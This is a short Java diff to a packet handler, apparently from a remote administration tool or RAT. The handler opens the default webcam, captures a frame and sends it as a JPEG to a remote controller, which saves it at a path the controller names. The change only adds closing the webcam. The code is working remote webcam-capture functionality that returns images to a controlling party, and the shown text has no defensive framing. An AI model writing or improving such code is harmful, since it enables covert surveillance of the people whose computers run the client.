@@ -24,17 +24,20 @@ public class S9PacketWebcam implements IPacket
 		{
 			final Webcam webcam = Webcam.getDefault();
 			final boolean open = webcam.open();
-			
 			if(!(open))
 				throw new Exception("could not open webcam");
 			
 			final BufferedImage image = webcam.getImage();
+			final boolean close = webcam.close();
 			
 			final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
 			ImageIO.write(image, "jpg", outputStream);
 			
 			Client.instance.outputStream.writeObject(new C2PacketSaveFile(outputStream.toByteArray(), this.outputpath));
 			outputStream.close();
+			
+			if(!(close))
+				throw new Exception("could not close webcam");
 		}
 		catch(Exception e)
 		{
